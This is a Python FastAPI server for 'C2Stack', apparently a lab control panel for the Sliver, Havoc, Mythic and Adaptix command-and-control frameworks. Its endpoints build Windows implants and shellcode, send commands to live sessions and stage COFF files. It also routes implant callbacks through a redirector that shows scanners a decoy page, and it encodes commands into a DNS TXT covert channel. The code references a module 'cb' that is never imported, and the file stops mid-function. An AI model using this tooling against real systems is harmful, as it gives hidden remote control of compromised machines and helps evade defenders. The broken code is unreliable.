"""C2Stack Flight Control & Visual Learning Hub API Server.

Serves the interactive dashboard, manages Docker services, verifies OPSEC redirector
routing, dissects DNS TXT covert channels, and provides cross-framework payload stagers.
"""

from __future__ import annotations

import base64
import http.client
import json
import os
import re
import socket
import urllib.parse
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, Field

app = FastAPI(
    title="C2Stack Flight Control",
    version="3.2.0",
    description="Unified Management & Visual Learning Portal for C2Stack",
)

app.add_middleware(
    CORSMiddleware,
    # The dashboard is served from this same origin, so no cross-origin access
    # is needed. A wildcard origin combined with allow_credentials is invalid
    # per the CORS spec and, if it ever were honoured, would let any page on
    # the host drive the container-control endpoints (start/stop/restart).
    allow_origins=[],
    allow_credentials=False,
    allow_methods=["GET"],
    allow_headers=["Content-Type"],
)

STATIC_DIR = Path(__file__).resolve().parent / "static"
if STATIC_DIR.exists():
    app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")

# Environment & Default Configuration
REDIRECTOR_HOST = os.environ.get("REDIRECTOR_HOST", "127.0.0.1")
REDIRECTOR_PORT = int(os.environ.get("REDIRECTOR_HTTP_PORT", "80"))
C2_HEADER_NAME = os.environ.get("C2_HEADER_NAME", "X-Request-ID")
C2_HEADER_VALUE = os.environ.get("C2_HEADER_VALUE", "cadre-c2")
MERIDIAN_DNS_DOMAIN = os.environ.get("MERIDIAN_DNS_DOMAIN", "c2.cadre.local")
# Victim-facing IP of the redirector host (what implants phone home to).
# Was hardcoded as 192.168.77.1 in a dozen stager strings; a lab on other
# addressing would silently generate wrong stagers, so it is env-driven now.
VICTIM_REDIRECTOR_IP = os.environ.get("VICTIM_REDIRECTOR_IP", "192.168.77.1")
MERIDIAN_DNS_PORT = int(os.environ.get("MERIDIAN_DNS_PORT", "15353"))

FRAMEWORK_PREFIXES = {
    "meridian": os.environ.get("MERIDIAN_URI_PREFIX", "/gateway/v1/telemetry"),
    "sliver": os.environ.get("SLIVER_URI_PREFIX", "/cloud/storage/objects"),
    "havoc": os.environ.get("HAVOC_URI_PREFIX", "/edge/cache/assets"),
    "adaptix": os.environ.get("ADAPTIX_URI_PREFIX", "/api/v1/sync"),
    "mythic": os.environ.get("MYTHIC_URI_PREFIX", "/cdn/media/stream"),
}

FRAMEWORK_PORTS = {
    "redirector": {"http": REDIRECTOR_PORT, "internal": 80, "type": "Edge Proxy / Decoy"},
    "meridian": {"dns": int(os.environ.get("MERIDIAN_DNS_PORT", "15353")), "http": "via redirector :80", "type": "HTTP / DNS TXT C2"},
    "sliver": {"control": int(os.environ.get("SLIVER_CTRL_PORT", "31337")), "http": "via redirector :80", "type": "Go C2 / In-Memory .NET"},
    "havoc": {"teamserver": int(os.environ.get("HAVOC_TS_PORT", "40056")), "http": "via redirector :80", "type": "C++ Demon / EDR Evasion"},
    "adaptix": {"teamserver": int(os.environ.get("ADAPTIX_TS_PORT", "4321")), "http": "via redirector :80", "type": "Go Multiplayer C2"},
    "mythic": {"ui": int(os.environ.get("MYTHIC_UI_PORT", "7443")), "http": "via redirector :80", "type": "Extensible Web C2"},
}


# ============================================================================
# Docker Integration (Socket inside container, CLI fallback on host)
# ============================================================================

class UnixSocketHTTPConnection(http.client.HTTPConnection):
    """HTTP connection over a local Unix domain socket."""

    def __init__(self, socket_path: str, timeout: int = 5) -> None:
        super().__init__("localhost", timeout=timeout)
        self.socket_path = socket_path

    def connect(self) -> None:
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect(self.socket_path)


def query_docker_socket(path: str, method: str = "GET", body: dict[str, Any] | None = None) -> Any:
    """Send an HTTP request directly to Docker's unix socket."""
    sock_path = "/var/run/docker.sock"
    if not os.path.exists(sock_path):
        return None

    conn = UnixSocketHTTPConnection(sock_path, timeout=4)
    try:
        headers = {"Host": "localhost"}
        payload_data = None
        if body is not None:
            headers["Content-Type"] = "application/json"
            payload_data = json.dumps(body)

        conn.request(method, path, body=payload_data, headers=headers)
        response = conn.getresponse()
        raw = response.read().decode("utf-8", errors="replace")
        if response.status in (200, 201, 204):
            return json.loads(raw) if raw.strip().startswith(("{", "[")) else raw
        return None
    except Exception:
        return None
    finally:
        # Always close: previously an exception between connect() and close()
        # leaked the fd until GC (fine on CPython, a real leak elsewhere).
        try:
            conn.close()
        except Exception:
            pass


def get_docker_containers() -> list[dict[str, Any]]:
    """Retrieve running/stopped containers via unix socket or docker CLI fallback."""
    # 1. Try Docker socket (when running inside container)
    socket_res = query_docker_socket("/containers/json?all=1")
    if socket_res and isinstance(socket_res, list):
        return socket_res

    # 2. Try Docker CLI (when running on host e.g. Windows/macOS/Linux host shell)
    import subprocess
    try:
        proc = subprocess.run(
            ["docker", "ps", "--all", "--format", "{{json .}}"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        if proc.returncode == 0 and proc.stdout.strip():
            cli_containers = []
            for line in proc.stdout.strip().splitlines():
                if not line.strip():
                    continue
                try:
                    c = json.loads(line)
                    name = c.get("Names", "").strip()
                    cli_containers.append({
                        "Id": c.get("ID", ""),
                        "Names": [f"/{name}"] if name and not name.startswith("/") else [name],
                        "State": c.get("State", "unknown").lower(),
                        "Status": c.get("Status", ""),
                        "Image": c.get("Image", ""),
                        "Ports": c.get("Ports", ""),
                    })
                except Exception:
                    continue
            return cli_containers
    except Exception:
        pass

    return []


def run_container_lifecycle(container_id: str, action: str) -> bool:
    """Execute lifecycle action via unix socket or docker CLI fallback."""
    if action not in ("start", "stop", "restart"):
        return False

    res = query_docker_socket(f"/containers/{container_id}/{action}", method="POST")
    if res is not None:
        return True

    import subprocess
    try:
        proc = subprocess.run(["docker", action, container_id], capture_output=True, text=True, timeout=10)
        return proc.returncode == 0
    except Exception:
        return False


def get_container_logs(container_id: str, tail: int = 100) -> str:
    """Fetch logs from container via unix socket or docker CLI fallback."""
    logs_raw = query_docker_socket(f"/containers/{container_id}/logs?stdout=1&stderr=1&tail={tail}")
    if logs_raw:
        return str(logs_raw)

    import subprocess
    try:
        proc = subprocess.run(["docker", "logs", "--tail", str(tail), container_id], capture_output=True, text=True, timeout=5)
        out = (proc.stdout or "") + (proc.stderr or "")
        return out if out.strip() else "No recent logs."
    except Exception as e:
        return f"Error reading logs: {e}"


def probe_tcp_port(host: str, port: int, timeout: float = 0.5) -> bool:
    """Test TCP port availability."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def probe_dns_txt_port(host: str, port: int, domain: str, timeout: float = 1.0) -> bool:
    """UDP liveness probe for the Meridian DNS listener.

    Meridian's only published port is UDP (DNS TXT C2), so a TCP connect probe
    always fails and reported the service as down while it was serving. Send a
    `ping.<domain>` TXT query and accept any well-formed answer (QR set, RCODE 0).
    """
    def _encode_name(name: str) -> bytes:
        out = b""
        for label in name.split("."):
            out += bytes([len(label)]) + label.encode("ascii")
        return out + b"\x00"

    header = b"\x12\x34\x01\x00\x00\x01" + b"\x00\x00" * 3
    question = header + _encode_name(domain) + b"\x00\x10\x00\x01"  # QTYPE=TXT, QCLASS=IN
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            sock.sendto(question, (host, port))
            data, _ = sock.recvfrom(4096)
    except OSError:
        return False
    return len(data) > 12 and bool(data[2] & 0x80) and (data[3] & 0x0F) == 0


def resolve_host_probe_address() -> str:
    """Published ports live on the Docker host, not in this container's
    namespace. Resolve the host gateway from the default route (falling back
    to loopback) so health probes hit the right interface."""
    try:
        import struct

        with open("/proc/net/route", "r") as f:  # noqa: SIM115
            for line in f.read().splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 3 and parts[1] == "00000000":
                    return socket.inet_ntoa(struct.pack("<I", int(parts[2], 16)))
    except Exception:
        pass
    return "127.0.0.1"


PROBE_HOST = os.environ.get("PROBE_HOST") or resolve_host_probe_address()


# ============================================================================
# Models
# ============================================================================

class RedirectorTestRequest(BaseModel):
    url_path: str = Field(default="/gateway/v1/telemetry", description="Request URI path")
    headers: dict[str, str] = Field(default_factory=dict, description="HTTP Request Headers")
    method: str = Field(default="GET", description="HTTP Method")


class VictimCommandRequest(BaseModel):
    command: str = Field(..., description="Command to run on ws01 over SSH")
    timeout: int = Field(30, description="Seconds before ssh gives up")


class AdaptixListenerRequest(BaseModel):
    name: str = Field("cadre_http", description="Listener instance name")
    callback_address: str = Field(f"{VICTIM_REDIRECTOR_IP}:80",
                                  description="Where the AGENT dials (the redirector)")
    uri: str = Field("/api/v1/sync", description="Must match ADAPTIX_URI_PREFIX")
    port: int = Field(80, description="In-container bind port")
    c2_header: str = Field("X-Request-ID")
    c2_header_value: str = Field("cadre-c2")


class AdaptixAgentRequest(BaseModel):
    agent: str = Field("beacon")
    listener: str = Field("cadre_http", description="Listener INSTANCE name")
    arch: str = Field("x64")
    format: str = Field("Exe")
    sleep: str = Field("30s")
    jitter: int = Field(0, description="Must be 0 on this snapshot (PR #379 bug)")


class AdaptixTaskRequest(BaseModel):
    agent_id: str = Field(..., description="a_id from /api/ops/adaptix/agents")
    cmdline: str = Field(..., description="Raw Adaptix command, e.g. 'whoami'")


class HavocBuildRequest(BaseModel):
    arch: str = Field("x64", description="x64 | x86")
    format: str = Field("Windows Exe",
                        description="Windows Exe | Windows Dll | Windows Shellcode | "
                                    "Windows Service Exe")
    listener: str = Field("c2stack - http", description="Listener instance name")
    sleep: int = Field(5, description="Beacon sleep in seconds")
    jitter: int = Field(15, description="0-100")


@app.get("/api/ops/havoc/sessions")
def ops_havoc_sessions() -> dict[str, Any]:
    """Live Havoc Demon sessions via the raw WebSocket protocol."""
    import havoc_client as hv
    try:
        return {"ok": True, "sessions": hv._run(hv.HavocClient().list_sessions())}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/havoc/listeners")
def ops_havoc_listeners() -> dict[str, Any]:
    import havoc_client as hv
    try:
        r = hv._run(hv.HavocClient().login_and_scan())
        return {"ok": True, "authenticated": r["authenticated"],
                "listeners": r["listeners"]}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.post("/api/ops/havoc/build")
def ops_havoc_build(req: HavocBuildRequest) -> dict[str, Any]:
    """Build a Demon payload server-side. No Qt client involved.

    Returns the PE base64-encoded plus the team's build console so failures
    (e.g. a missing cross-compiler) are visible rather than a bare error.
    """
    import havoc_client as hv
    try:
        cfg = hv.demon_config(sleep=req.sleep, jitter=req.jitter)
        result = hv._run(hv.HavocClient().build_payload(
            listener=req.listener, arch=req.arch, fmt=req.format, config=cfg))
        return {
            "ok": True,
            "filename": result["filename"],
            "size": result["size"],
            "base64": base64.b64encode(result["payload"]).decode("ascii"),
            "console": result["console"],
        }
    except hv.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/havoc/task")
def ops_havoc_task(demon_id: str, command: str,
                   wait: int = 25) -> dict[str, Any]:
    """Task a Havoc session directly (the /api/ops/task path also covers this)."""
    import havoc_client as hv
    try:
        return {"ok": True, "result": hv._run(
            hv.HavocClient().task(demon_id, command, wait=float(wait)))}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


class SliverGenerateRequest(BaseModel):
    kind: str = Field("session", description="beacon | session (sessions are "
                                             "taskable immediately; beacons need "
                                             "`interactive` first)")
    c2_url: str = Field(f"{VICTIM_REDIRECTOR_IP}:80/cloud/storage/objects",
                        description="Implant callback URL (redirector prefix)")
    target_os: str = Field("windows", description="windows | linux")
    arch: str = Field("amd64", description="amd64 | 386")


@app.get("/api/ops/sliver/beacons")
def ops_sliver_beacons() -> dict[str, Any]:
    """Checked-in Sliver beacons (read-only: beacons take no direct tasks)."""
    import sliver_client as sc
    try:
        return {"ok": True, "beacons": sc.beacons()}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/sliver/tasks")
def ops_sliver_tasks(beacon_id: str) -> dict[str, Any]:
    """Beacon task states (queued/sent/completed) for async beacon tasking."""
    import sliver_client as sc
    try:
        return {"ok": True, "tasks": sc.beacon_tasks(beacon_id)}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


class MythicUploadResponse(BaseModel):
    agent_file_id: str
    filename: str


class MythicBuildRequest(BaseModel):
    output_type: str = Field("WinExe", description="WinExe | Shellcode | Service | Source")
    shellcode_format: str = Field("Binary", description="Donut format for Shellcode")
    shellcode_bypass: str = Field("Continue on fail")
    debug: bool = Field(False)
    adjust_filename: bool = Field(True)
    enable_keying: bool = Field(False)
    keying_method: str = Field("Hostname", description="Hostname | Domain | Registry")
    keying_value: str = Field("", description="Upper-cased at build; Domain compares NETBIOS UserDomainName")
    registry_path: str = Field("")
    registry_value: str = Field("")
    registry_comparison: str = Field("Matches", description="Matches | Contains")
    filename: str = Field("apollo-portal.exe")
    # NOTE: Registry keying is broken upstream (CS1009 on any real path);
    # the endpoint passes values through and reports the build error plainly.


def _mythic_http_c2() -> dict[str, Any]:
    """Working http-profile C2 shape (bare host + full-path post_uri).

    A rooted post_uri REPLACES any base path (HttpProfile.cs ParseURLAndPort),
    so a path-carrying host + "data" silently phones http://host/data into the
    decoy. callback_host carries no port (OPSEC rejects it).
    """
    return {
        "callback_host": f"http://{VICTIM_REDIRECTOR_IP}",
        "callback_port": REDIRECTOR_PORT,
        "callback_interval": 10,
        "callback_jitter": 23,
        "headers": {C2_HEADER_NAME: C2_HEADER_VALUE},
        "post_uri": f"{FRAMEWORK_PREFIXES['mythic']}/data",
        "AESPSK": "aes256_hmac",
        "encrypted_exchange_check": True,
        "killdate": "2027-09-07",
        "proxy_host": "",
        "proxy_port": "",
        "proxy_user": "",
        "proxy_pass": "",
    }


@app.post("/api/ops/mythic/build")
def ops_mythic_build(req: MythicBuildRequest) -> dict[str, Any]:
    """Submit an Apollo build. Returns immediately with the payload uuid.

    dotnet builds take minutes and would block the single uvicorn worker, so
    submission is sync but the BUILD is async server-side: poll
    GET /api/ops/mythic/build/{uuid} for phase, then fetch the binary from
    GET /api/ops/mythic/payload/{uuid}.
    """
    client = cb.MythicClient()
    params = {
        "output_type": req.output_type,
        "shellcode_format": req.shellcode_format,
        "shellcode_bypass": req.shellcode_bypass,
        "adjust_filename": req.adjust_filename,
        "debug": req.debug,
        "enable_keying": req.enable_keying,
        "keying_method": req.keying_method,
        "keying_value": req.keying_value,
        "registry_path": req.registry_path,
        "registry_value": req.registry_value,
        "registry_comparison": req.registry_comparison,
    }
    definition = {
        "payload_type": "apollo",
        "selected_os": "Windows",
        "filename": req.filename,
        "description": f"portal build {req.output_type}",
        "build_parameters": [{"name": k, "value": v} for k, v in params.items()],
        "c2_profiles": [{"c2_profile": "http",
                         "c2_profile_parameters": _mythic_http_c2()}],
        # Loader commands included so COFF flows work out of the box.
        "commands": ["shell", "whoami", "ls", "ps", "download", "upload",
                     "execute_coff", "register_coff", "register_file",
                     "powershell", "run", "sleep", "exit"],
    }
    try:
        out = client.post(
            "/api/v1.4/createpayload_webhook",
            {"input": {"payloadDefinition": json.dumps(definition)}})
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc
    # Webhook replies arrive as CONCATENATED json objects ({...}{...});
    # find the success chunk carrying the uuid.
    uuid = ""
    for chunk in json.dumps(out).split("}{"):
        try:
            obj = json.loads(chunk if chunk.startswith("{") else "{" + chunk)
            if isinstance(obj, dict) and obj.get("uuid"):
                uuid = obj["uuid"]
        except ValueError:
            continue
    if not uuid:
        raise HTTPException(status_code=502,
                            detail=f"build not queued: {json.dumps(out)[:300]}")
    return {"ok": True, "uuid": uuid,
            "status_url": f"/api/ops/mythic/build/{uuid}"}


@app.get("/api/ops/mythic/build/{uuid}")
def ops_mythic_build_status(uuid: str) -> dict[str, Any]:
    """Build phase for a submitted Apollo payload."""
    import re as _re
    # mythic_psql does no parameter binding: whitelist the uuid shape so a
    # path parameter can never become SQL.
    if not _re.fullmatch(r"[0-9a-fA-F-]{36}", uuid or ""):
        raise HTTPException(status_code=400, detail="malformed payload uuid")
    try:
        rows = cb.mythic_psql(
            "SELECT build_phase, left(build_message, 500), "
            f"left(build_stderr, 500) FROM payload WHERE uuid='{uuid}';",
            ["phase", "message", "stderr"])
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc
    if not rows:
        raise HTTPException(status_code=404, detail="unknown payload uuid")
    r = rows[0]
    out: dict[str, Any] = {"ok": True, "uuid": uuid, "phase": r.get("phase"),
                           "message": (r.get("message") or "")[:500]}
    if r.get("phase") == "error":
        out["stderr"] = (r.get("stderr") or "")[-800:]
    if r.get("phase") == "success":
        out["download_url"] = f"/api/ops/mythic/payload/{uuid}"
    return out


@app.get("/api/ops/mythic/payload/{uuid}")
def ops_mythic_payload(uuid: str):
    """Download a built Apollo payload through the portal (JWT stays inside)."""
    import re as _re
    from fastapi.responses import Response as FastAPIResponse
    if not _re.fullmatch(r"[0-9a-fA-F-]{36}", uuid or ""):
        raise HTTPException(status_code=400, detail="malformed payload uuid")
    client = cb.MythicClient()
    try:
        data = client.get(f"/direct/download/{uuid}", timeout=300)
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc
    return FastAPIResponse(
        content=data, media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="apollo-{uuid}.bin"'})


@app.post("/api/ops/mythic/upload")
async def ops_mythic_upload(request: Request) -> dict[str, Any]:
    """Stage an operator file (e.g. a COFF .o) in Mythic for tasking.

    Multipart form with a `file` field (same contract as
    task_upload_file_webhook — JSON bodies are rejected with "Missing file
    in form"). Returns the agent_file_id to reference from register_file /
    execute_coff "Use Existing File" flows.
    """
    form = await request.form()
    upload = form.get("file")
    if upload is None or not hasattr(upload, "read"):
        raise HTTPException(status_code=400,
                            detail="multipart form with a `file` field required")
    content = await upload.read()
    filename = getattr(upload, "filename", None) or "upload.bin"
    import urllib.request as _url
    import uuid as _uuid
    boundary = "----x" + _uuid.uuid4().hex
    CRLF = "\r\n"
    body = ((f"--{boundary}{CRLF}Content-Disposition: form-data; "
             f'name="file"; filename="{filename}"{CRLF}'
             f"Content-Type: application/octet-stream{CRLF}{CRLF}").encode()
            + content + CRLF.encode()
            + (f"--{boundary}--{CRLF}").encode())
    client = cb.MythicClient()
    token = client._login()
    req = _url.Request(
        f"{client.endpoint}/api/v1.4/task_upload_file_webhook", data=body,
        headers={"Authorization": f"Bearer {token}",
                 "Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST")
    try:
        with _url.urlopen(req, timeout=120) as resp:
            data = json.loads(resp.read().decode("utf-8", "replace"))
    except Exception as exc:
        raise HTTPException(status_code=502, detail=str(exc)[:200]) from exc
    if data.get("status") == "error":
        raise HTTPException(status_code=502, detail=str(data.get("error"))[:200])
    return {"ok": True, "agent_file_id": data.get("agent_file_id"),
            "filename": filename, "size": len(content)}


@app.post("/api/ops/sliver/generate")
def ops_sliver_generate(req: SliverGenerateRequest) -> dict[str, Any]:
    """Build a Sliver implant server-side (garble compile, ~40s+).

    The 48 MB binary stays in the sliver container; the response carries the
    `docker cp` retrieval command instead of a giant base64 body.
    """
    import sliver_client as sc
    try:
        return {"ok": True, **sc.generate(req.kind, req.c2_url,
                                          req.target_os, req.arch)}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/catalogues")
def ops_catalogues() -> dict[str, Any]:
    """Tasking vocabularies per framework, for the Operations Console.

    Each catalogue entry is source-derived (Havoc: ConsoleInput.cc +
    CommandSend.cc + teamserver demons.go; Adaptix: beacon_agent
    ax_config.axs; Meridian: implant mtasks; Sliver: implant CLI help).
    Entries carry per-command live-verification state in
    doc/internal/CAPABILITY-MATRIX.md — the catalogue itself asserts shapes,
    not results.
    """
    import adaptix_client as ax
    import havoc_client as hv
    return {
        "havoc": {
            name: {"help": spec["help"], "verified": bool(spec.get("verified"))}
            for name, spec in hv.COMMANDS.items()
        },
        "adaptix": {
            name: {"help": spec["help"], "example": spec["example"]}
            for name, spec in ax.COMMANDS.items()
        },
        "meridian": {
            "exec": {"help": "Run without shell (argv split): exec <cmd...>"},
            "shell": {"help": "Run via /bin/sh -c (Linux) — Windows implants "
                              "lack a shell; prefer exec with cmd.exe"},
            "download": {"help": "Retrieve file: download <remote path>"},
            "upload": {"help": "Send file: upload <local> <remote>"},
            "sleep": {"help": "Beacon profile: sleep <sec> [jitter%]"},
            "exit": {"help": "Ask the implant to exit cleanly"},
        },
        "sliver": {
            "execute": {"help": "Run binary directly (NO shell): "
                                "program [args...]; wrap shell work in "
                                "cmd.exe \"/c ...\""},
            "getuid": {"help": "Session user/SID"},
            "hostname": {"help": "Target hostname (via execute)"},
            "download": {"help": "Fetch file: download <remote> <local>"},
            "upload": {"help": "Send file: upload <local> <remote>"},
            "ps": {"help": "Remote process list"},
            "info": {"help": "Session info"},
        },
        "mythic": {
            "shell": {"help": "ALIAS: params is the RAW command line, not JSON"},
            "powershell": {"help": "Named command (JSON args)"},
            "ls/cd/pwd/cat/download/upload": {"help": "Named FS commands (JSON args)"},
            "execute_coff": {"help": "COFF loader (verified live): upload the "
                             ".o via POST /api/ops/mythic/upload (multipart "
                             "`file` field), register_file it by filename, "
                             "then execute_coff {coff_name, function_name, "
                             "timeout}. Beacon imports need __declspec("
                             "dllimport) or the loader returns status 1"},
            "register_coff/register_file": {"help": "Stage .o files by name "
                                            "(Use Existing File group)"},
        },
    }


class DnsDissectRequest(BaseModel):
    payload_text: str = Field(default="whoami /all", description="Command or message to transmit over DNS TXT")
    domain_suffix: str = Field(default="c2.cadre.local", description="DNS C2 zone suffix")
    session_id: str = Field(default="A3F99B", description="Hex or Base32 session identifier")


# ============================================================================
# Routes
# ============================================================================

@app.get("/", response_class=HTMLResponse)
async def serve_index() -> Any:
    """Serve the single page application dashboard."""
    index_path = STATIC_DIR / "index.html"
    if index_path.exists():
        return FileResponse(str(index_path))
    return HTMLResponse("<h1>C2Stack Portal Dashboard</h1><p>Static index.html not found.</p>")


@app.get("/api/status")
def get_status() -> dict[str, Any]:
    """Return health, published ports, and container states across the stack."""
    docker_containers = get_docker_containers()
    container_map = {}
    for c in docker_containers:
        names = c.get("Names", [])
        state = c.get("State", "unknown").lower()
        status = c.get("Status", "")
        cid = c.get("Id", "")[:12]
        for name in names:
            clean_name = name.lstrip("/").lower()
            container_map[clean_name] = {"id": cid, "state": state, "status": status}

    services_status = {}
    for svc, meta in FRAMEWORK_PORTS.items():
        # Match against the docker container map. Compose service names appear as
        # "<project>-<service>-<n>", so prefer the exact "<prefix>-<svc>" segment
        # over a bare substring test: "mythic" also occurs inside
        # "c2stack-mythic_postgres-1", which made the Mythic card report the
        # database container (and its logs) instead of the server.
        matched_container = None
        exact = f"-{svc}-"
        for cname, cinfo in container_map.items():
            if exact in cname:
                matched_container = cinfo
                break
        if matched_container is None:
            for cname, cinfo in container_map.items():
                if svc in cname:
                    matched_container = cinfo
                    break

        # Check port reachability (published host ports only; string values
        # like "via redirector :80" describe internal bindings and are skipped)
        is_port_live = False
        port_key = next(
            (k for k in ("control", "teamserver", "ui", "dns", "http") if isinstance(meta.get(k), int)),
            None,
        )
        if port_key == "dns":
            # UDP-only published port: probe it as DNS, not as TCP
            is_port_live = probe_dns_txt_port(PROBE_HOST, meta["dns"], MERIDIAN_DNS_DOMAIN)
        elif port_key is not None:
            is_port_live = probe_tcp_port(PROBE_HOST, meta[port_key])

        # State evaluation: running if docker says running OR if port is responding
        is_running = False
        if matched_container and matched_container["state"] == "running":
            is_running = True
        elif is_port_live:
            is_running = True

        state = "running" if is_running else (matched_container["state"] if matched_container else "stopped")

        services_status[svc] = {
            "name": svc.capitalize(),
            "role": meta["type"],
            "state": state,
            "ports": meta,
            "container": matched_container,
            "port_live": is_port_live,
            "uri_prefix": FRAMEWORK_PREFIXES.get(svc),
        }

    return {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "docker_available": bool(docker_containers),
        "redirector_http_port": REDIRECTOR_PORT,
        "victim_redirector_ip": VICTIM_REDIRECTOR_IP,
        "c2_header": f"{C2_HEADER_NAME}: {C2_HEADER_VALUE}",
        "services": services_status,
    }


@app.post("/api/containers/{service_name}/action")
def container_action(service_name: str, action: str) -> dict[str, Any]:
    """Execute lifecycle action (start/stop/restart) on a C2Stack container."""
    clean_target = service_name.lower()
    if clean_target not in FRAMEWORK_PORTS:
        # Allow-list: the endpoint controls Docker, so an unrecognised name must
        # not fall through to a substring match that could hit another container.
        raise HTTPException(status_code=404, detail=f"unknown service '{service_name}'")

    docker_containers = get_docker_containers()
    target_id = None
    for c in docker_containers:
        for name in c.get("Names", []):
            if clean_target in name.lower():
                target_id = c.get("Id")
                break
        if target_id:
            break

    if not target_id:
        return {
            "status": "mock",
            "message": f"Action '{action}' simulated for '{service_name}' (Container not found).",
            "service": service_name,
        }

    ok = run_container_lifecycle(target_id, action)
    return {"status": "ok" if ok else "error", "action": action, "service": service_name, "container_id": target_id}


@app.get("/api/containers/{service_name}/logs")
def container_logs(service_name: str, tail: int = 100) -> dict[str, Any]:
    """Fetch logs from container via Docker socket or CLI."""
    docker_containers = get_docker_containers()
    target_id = None
    clean_target = service_name.lower()
    for c in docker_containers:
        for name in c.get("Names", []):
            if clean_target in name.lower():
                target_id = c.get("Id")
                break
        if target_id:
            break

    if not target_id:
        return {
            "service": service_name,
            "logs": f"[{datetime.now(timezone.utc).strftime('%H:%M:%S')}] Service '{service_name}' container not currently found in docker ps.",
        }

    logs = get_container_logs(target_id, tail=tail)
    return {"service": service_name, "logs": logs}



@app.post("/api/redirector/test")
def test_redirector_flow(req: RedirectorTestRequest) -> dict[str, Any]:
    """Simulate an incoming packet at Apache port 80 and return the visual routing trace.

    Demonstrates the OPSEC header check (X-Request-ID: cadre-c2) and prefix-based C2 routing.
    """
    has_valid_header = False
    for k, v in req.headers.items():
        if k.lower() == C2_HEADER_NAME.lower() and v.strip() == C2_HEADER_VALUE:
            has_valid_header = True
            break

    trace = [
        {
            "step": 1,
            "title": "Ingress Callback Arrives",
            "node": "Apache Edge Gateway (:80)",
            "detail": f"Incoming {req.method} request to path '{req.url_path}'",
            "status": "received",
        }
    ]

    matched_framework = None
    clean_path = req.url_path.strip()
    for fw, prefix in FRAMEWORK_PREFIXES.items():
        if clean_path.startswith(prefix):
            matched_framework = fw
            break

    if not has_valid_header:
        # Diverted to CloudEdge CDN Decoy Page
        trace.append({
            "step": 2,
            "title": f"Inspect Header: {C2_HEADER_NAME}",
            "node": "Apache RewriteEngine",
            "detail": f"Header '{C2_HEADER_NAME}: {C2_HEADER_VALUE}' MISSING or INVALID. Access Denied to C2 Core.",
            "status": "shield_divert",
        })
        trace.append({
            "step": 3,
            "title": "Serve Decoy CDN Content",
            "node": "CloudEdge CDN Engine",
            "detail": "Serving benign HTTP 200 OK CDN asset page. Internal C2 teamservers remain 100% invisible to threat hunters and scanners.",
            "status": "decoy_served",
        })
        outcome = {
            "routed_to": "CloudEdge CDN Decoy Page",
            "http_status": 200,
            "content_type": "text/html",
            "preview": "<html><head><title>CloudEdge Global Edge Delivery</title></head><body><h1>Asset Cached</h1></body></html>",
            "opsec_shielded": True,
            "trace": trace,
        }
    else:
        # Header valid -> Route to backend
        trace.append({
            "step": 2,
            "title": f"Inspect Header: {C2_HEADER_NAME}",
            "node": "Apache RewriteEngine",
            "detail": f"Header verified ('{C2_HEADER_NAME}: {C2_HEADER_VALUE}'). Access granted to internal C2 network.",
            "status": "header_verified",
        })

        if matched_framework:
            backend_port = FRAMEWORK_PORTS[matched_framework].get("http", 80)
            trace.append({
                "step": 3,
                "title": f"Reverse Proxy to {matched_framework.capitalize()}",
                "node": f"Internal c2_core network (http://{matched_framework}:{backend_port})",
                "detail": f"Proxying payload beacon to {matched_framework} container. Zero direct internet exposure.",
                "status": "c2_forwarded",
            })
            outcome = {
                "routed_to": f"C2 Backend [{matched_framework.upper()}]",
                "http_status": 200,
                "framework": matched_framework,
                "internal_endpoint": f"http://{matched_framework}:{backend_port}{clean_path}",
                "opsec_shielded": False,
                "trace": trace,
            }
        else:
            trace.append({
                "step": 3,
                "title": "Prefix Mismatch",
                "node": "Apache Proxy",
                "detail": f"No C2 framework mapped to URI prefix '{clean_path}'. Returning HTTP 404.",
                "status": "not_found",
            })
            outcome = {
                "routed_to": "HTTP 404 (Prefix Mismatch)",
                "http_status": 404,
                "framework": None,
                "opsec_shielded": True,
                "trace": trace,
            }

    return outcome


@app.post("/api/dns/dissect")
def dissect_dns_tunnel(req: DnsDissectRequest) -> dict[str, Any]:
    """Dissect and visualize Base32 DNS TXT covert tunneling as implemented in Meridian C2.

    Breaks commands down into safe RFC 1035 labels and simulates server reassembly.
    """
    raw_bytes = req.payload_text.encode("utf-8")
    # Base32 encode without padding for clean DNS labels
    b32_encoded = base64.b32encode(raw_bytes).decode("ascii").rstrip("=")
    
    # Meridian splits into 36-character chunk labels
    chunk_size = 36
    chunks = [b32_encoded[i : i + chunk_size] for i in range(0, len(b32_encoded), chunk_size)]
    total_chunks = len(chunks)

    dissected_packets = []
    for idx, chunk in enumerate(chunks, start=1):
        fqdn = f"{idx:02d}.{req.session_id}.{chunk}.{req.domain_suffix}".lower()
        dissected_packets.append({
            "sequence": idx,
            "total": total_chunks,
            "chunk_data": chunk,
            "chunk_len": len(chunk),
            "generated_query": fqdn,
            "query_type": "TXT",
            "udp_port": 15353,
            "label_safe": len(chunk) <= 63,
        })

